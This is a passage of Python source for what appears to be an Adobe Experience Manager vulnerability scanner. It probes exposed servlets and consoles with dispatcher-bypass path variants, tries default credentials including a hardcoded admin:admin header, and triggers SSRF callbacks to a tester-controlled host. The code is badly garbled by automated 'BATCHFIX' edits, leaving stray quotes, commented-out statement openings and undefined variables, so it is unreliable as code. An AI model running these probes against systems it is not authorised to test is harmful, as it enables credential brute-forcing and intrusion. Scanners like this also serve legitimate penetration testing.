""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in LOGINSTATUS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "authenticated=" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "LoginStatusServlet","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "LoginStatusServlet is exposed, it allows to bruteforce credentials."  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                     "You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy,"  # [BATCHFIX] closed string"                    "cq:LastModifiedBy attributes of any JCR node.","                )
                results.append(f)

                for creds in CREDS:
                    auth_val = base64.b64encode(creds.encode()).decode()
                    headers = {"Authorization": "Basic {}".format(auth_val)}"                    resp = http_request(url, additional_headers=headers, proxy=proxy, debug=debug)

                    if "authenticated=true" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                         f = Finding(
                            "AEM with default credentials", url, 'AEM with default credentials "{0}".'.format(creds)"'                        )
                        results.append(f)

                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_loginstatus_servlet", url=url)"
    return results


# @register('currentuser_servlet')'def exposed_currentuser_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     CURRENTUSER = itertools.product(
        ("/libs/granite/security/currentuser", "///libs///granite///security///currentuser"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".css","            ".ico","            ".png","            ".gif","            ".html","            ".js","            ".json?{0}.css","            ".json/{0}.1.json","            ".json;%0a{0}.css","            ".json;%0a{0}.html","            ".json;%0a{0}.js","            ".json;%0a{0}.ico","            "...4.2.1...json","        ),
    )
    CURRENTUSER = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CURRENTUSER)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in CURRENTUSER:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "authorizableId" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "CurrentUserServlet","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "CurrentUserServlet is exposed, it allows to bruteforce credentials."  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                     "You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy,"  # [BATCHFIX] closed string"                    "cq:LastModifiedBy attributes of any JCR node.","                )
                results.append(f)

                for creds in CREDS:
                    auth_val = base64.b64encode(creds.encode()).decode()
                    headers = {"Authorization": "Basic {}".format(auth_val)}"                    resp = http_request(url, additional_headers=headers, proxy=proxy, debug=debug)

                    if "anonymous" not in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                         f = Finding(
                            "AEM with default credentials", url, 'AEM with default credentials "{0}".'.format(creds)"'                        )
                        results.append(f)

                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_currentuser_servlet", url=url)"
    return results


@register("userinfo_servlet")"def exposed_userinfo_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     USERINFO = itertools.product(
        ("/libs/cq/security/userinfo", "///libs///cq///security///userinfo"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".css","            ".ico","            ".png","            ".gif","            ".html","            ".js","            ".json?{0}.css","            ".json/{0}.1.json","            ".json;%0a{0}.css","            ".json;%0a{0}.html","            ".json;%0a{0}.ico","            "...4.2.1...json","        ),
    )

    USERINFO = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in USERINFO)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in USERINFO:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "userID" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "UserInfoServlet","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "UserInfoServlet is exposed, it allows to bruteforce credentials."  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                     "You can get valid usernames from jcr:createdBy, jcr:lastModifiedBy,"  # [BATCHFIX] closed string"                    "cq:LastModifiedBy attributes of any JCR node.","                )
                results.append(f)

                for creds in CREDS:
                    auth_val = base64.b64encode(creds.encode()).decode()
                    headers = {"Authorization": "Basic {}".format(auth_val)}"                    resp = http_request(url, additional_headers=headers, proxy=proxy, debug=debug)

                    if "anonymous" not in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                         f = Finding(
                            "AEM with default credentials", url, 'AEM with default credentials "{0}".'.format(creds)"'                        )
                        results.append(f)

                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_userinfo_servlet", url=url)"
    return results


@register("felix_console")"def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     FELIXCONSOLE = itertools.product(
        ("/system/console/bundles", "///system///console///bundles"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            ".json","            ".1.json","            ".4.2.1...json","            ".css","            ".ico","            ".png","            ".gif","            ".html","            ".js","            ";%0a{0}.css","            ";%0a{0}.html","            ";%0a{0}.png","            ".json;%0a{0}.ico","            ".servlet/{0}.css","            ".servlet/{0}.js","            ".servlet/{0}.html","            ".servlet/{0}.ico","        ),
    )
    FELIXCONSOLE = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in FELIXCONSOLE)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in FELIXCONSOLE:
        url = normalize_url(base_url, path)
        headers = {"Authorization": "Basic YWRtaW46YWRtaW4="}"        try:
            resp = http_request(url, additional_headers=headers, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "Web Console - Bundles" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "FelixConsole","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "Felix Console is exposed, you may get RCE by installing OSGI bundle."  # [BATCHFIX] closed string"                    "See - https://github.com/0ang3el/aem-rce-bundle","                )
                results.append(f)

                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_felix_console", url=url)"
    return results


@register("wcmdebug_filter")"def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     WCMDEBUG = itertools.product(
        ("/", "/content", "/content/dam"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".1.json","            "...4.2.1...json","            ".json/{0}.css","            ".json/{0}.html","            ".json/{0}.ico","            ".json;%0a{0}.css","            ".json;%0a{0}.html","            ".json;%0a{0}.ico","        ),
        ("?debug=layout",),"    )
    WCMDEBUG = list("{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in WCMDEBUG)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in WCMDEBUG:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "res=" in str(resp.content) and "sel=" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "WCMDebugFilter","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "WCMDebugFilter exposed and might be vulnerable to reflected XSS (CVE-2016-7882)."  # [BATCHFIX] closed string"                    "See - https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c","                )

                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_wcmdebug_filter", url=url)"
    return results


@register("wcmsuggestions_servlet")"def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     WCMSUGGESTIONS = itertools.product(
        ("/bin/wcm/contentfinder/connector/suggestions", "///bin///wcm///contentfinder///connector///suggestions"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".css","            ".html","            ".ico","            ".png","            ".gif","            ".json/{0}.1.json","            ".json;%0a{0}.css","            ".json/{0}.css","            ".json/{0}.ico","            ".json/{0}.html","            "...4.2.1...json","        ),
        ("?query_term=path%3a/&pre=<1337abcdef>&post=yyyy",),"    )
    WCMSUGGESTIONS = list("{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in WCMSUGGESTIONS)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in WCMSUGGESTIONS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "<1337abcdef>" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "WCMSuggestionsServlet","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "WCMSuggestionsServlet exposed and might result in reflected XSS. See -"  # [BATCHFIX] closed string"                    "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=96","                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_wcmsuggestions_servlet", url=url)"
    return results


@register("crxde_crx")"def exposed_crxde_crx(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     CRXDELITE = itertools.product(
        ("/crx/de/index.jsp", "///crx///de///index.jsp"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ";%0a{0}.css", ";%0a{0}.html", ";%0a{0}.js", ";%0a{0}.ico", "?{0}.css", "?{0}.html", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    CRXDELITE = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CRXDELITE)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     CRX = itertools.product(
        ("/crx/explorer/browser/index.jsp", "///crx///explorer///browser///index.jsp"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ";%0a{0}.css", ";%0a{0}.html", ";%0a{0}.ico", "?{0}.css", "?{0}.html", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    CRX = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CRX)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     CRXSEARCH = itertools.product(
        ("/crx/explorer/ui/search.jsp", "/crx///explorer///ui///search.jsp"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ";%0a{0}.css", ";%0a{0}.html", ";%0a{0}.ico", "?{0}.css", "?{0}.html", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    CRXSEARCH = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CRXSEARCH)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     CRXNAMESPACE = itertools.product(
        ("/crx/explorer/ui/namespace_editor.jsp", "///crx/explorer///ui///namespace_editor.jsp"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ";%0a{0}.css", ";%0a{0}.html", ";%0a{0}.ico", "?{0}.css", "?{0}.html", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    CRXNAMESPACE = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CRXNAMESPACE)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     PACKMGR = itertools.product(
        ("/crx/packmgr/index.jsp", "///crx///packmgr///index.jsp"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ";%0a{0}.css", ";%0a{0}.html", ";%0a{0}.ico", "?{0}.css", "?{0}.html", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    PACKMGR = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in PACKMGR)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in itertools.chain(CRXDELITE, CRX, CRXSEARCH, CRXNAMESPACE, PACKMGR):
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             if resp.status_code == 200 and (
                "CRXDE Lite" in str(resp.content)"                or "Content Explorer" in str(resp.content)"                or "CRX Package Manager" in str(resp.content)"                or "Search for:" in str(resp.content)"                or "Namespace URI" in str(resp.content)"            ):
                f = Finding("CRXDE Lite/CRX", url, "Sensitive information might be exposed. Check manually.")"
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_crxde_crx", url=url)"
    return results


# @register('reports')'def exposed_reports(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     DISKUSAGE = itertools.product(
        ("/etc/reports/diskusage.html", "///etc/reports///diskusage.html"),"        ("/{0}.css", "/{0}.ico", ";%0a{0}.css", ";%0a{0}.ico"),"    )
    DISKUSAGE = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in DISKUSAGE)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in DISKUSAGE:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and ("Disk Usage" in str(resp.content)):"                f = Finding("Disk Usage report", url, "Disk Usage report are exposed.")"
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_reports", url=url)"
    return results


@register("salesforcesecret_servlet")"def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SALESFORCESERVLET1 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
"""             "/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","            "/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y"  # [BATCHFIX] closed string"            "&refresh_token=z&instance_url={{0}}%23","        ),
        (".json", ".1.json", ".4.2.1...json", ".html"),"    )
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     SALESFORCESERVLET1 = list(pair[0].format(pair[1]) for pair in SALESFORCESERVLET1)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SALESFORCESERVLET2 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
"""             "/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","            "/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y"  # [BATCHFIX] closed string"            "&refresh_token=z&instance_url={{0}}%23","        ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".html/{0}.1.json","            ".html/{0}.4.2.1...json","            ".html/{0}.css","            ".html/{0}.js","            ".html/{0}.png","            ".html/{0}.bmp","            ".html;%0a{0}.css","            ".html;%0a{0}.js","            ".json;%0a{0}.css","            ".html;%0a{0}.png","            ".json;%0a{0}.png","            ".json;%0a{0}.html","            ".json/{0}.css","            ".json/{0}.js","            ".json/{0}.png","            ".json/a.gif","            ".json/{0}.ico","            ".json/{0}.html","        ),
    )
    cache_buster = random_string()
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     SALESFORCESERVLET2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET2)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SALESFORCESERVLET3 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
"""             "/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}"  # [BATCHFIX] closed string"            "&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e","            "/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23","# [BATCHFIX] Commented metadata/non-Python
"""             "///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y"  # [BATCHFIX] closed string"            "&refresh_token=z&instance_url={{0}}%23","        ),
        (".{0}.css", ".{0}.js", ".{0}.png", ".{0}.ico", ".{0}.bmp", ".{0}.gif", ".{0}.html"),"    )
    cache_buster = randint(1, 2**12)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     SALESFORCESERVLET3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET3)""""
    for path in itertools.chain(SALESFORCESERVLET1, SALESFORCESERVLET2, SALESFORCESERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/salesforcesecret/{2}/".format(my_host, token, encoded_orig_url)"        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy, debug=debug)
        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_salesforcesecret_servlet", url=url)"
    time.sleep(10)

    if "salesforcesecret" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("salesforcesecret")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "SalesforceSecretServlet","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via SalesforceSecretServlet (CVE-2018-5006) was detected."  # [BATCHFIX] closed string"            "See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html","        )

        results.append(f)

    return results


@register("reportingservices_servlet")"def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     REPOSTINGSERVICESSERVLET1 = (
        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.4.2.1...json"  # [BATCHFIX] closed string"        "?url={0}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json?url={0}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a","        "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.json"  # [BATCHFIX] closed string"        "?url={0}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.4.2.1...json"  # [BATCHFIX] closed string"        "?url={0}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.1.json"  # [BATCHFIX] closed string"        "?url={0}%23/api1.omniture.com/a&q=a","        "///libs///cq///contentinsight///proxy///reportingservices.json?url={0}%23/api1.omniture.com/a&q=a","        "///libs///cq///contentinsight///proxy///reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a","        "///libs///cq///contentinsight///proxy///reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a","    )

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     REPOSTINGSERVICESSERVLET2 = (
# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.css"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.js"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.png"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.gif"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.css"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.js"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.png"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.gif"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.css"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.js"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.ico"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.png"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.css"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.js"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.ico"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.png"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","    )
    cache_buster = random_string()
    REPOSTINGSERVICESSERVLET2 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET2)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     REPOSTINGSERVICESSERVLET3 = (
